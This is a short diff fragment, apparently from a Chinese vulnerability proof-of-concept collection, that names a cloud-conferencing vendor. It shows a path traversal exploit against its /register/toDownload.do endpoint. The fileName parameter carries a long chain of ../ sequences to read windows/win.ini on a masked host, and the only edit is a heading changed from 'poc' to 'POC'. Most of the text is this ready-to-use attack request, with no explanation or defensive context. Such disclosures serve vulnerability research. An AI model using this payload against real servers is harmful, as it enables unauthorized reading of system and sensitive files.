@@ -8,7 +8,7 @@
 "深圳银澎云计算有限公司"
 ```
 
-## poc
+## POC
 ```
 /register/toDownload.do?fileName=敏感文件路径
 https://xxxxxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
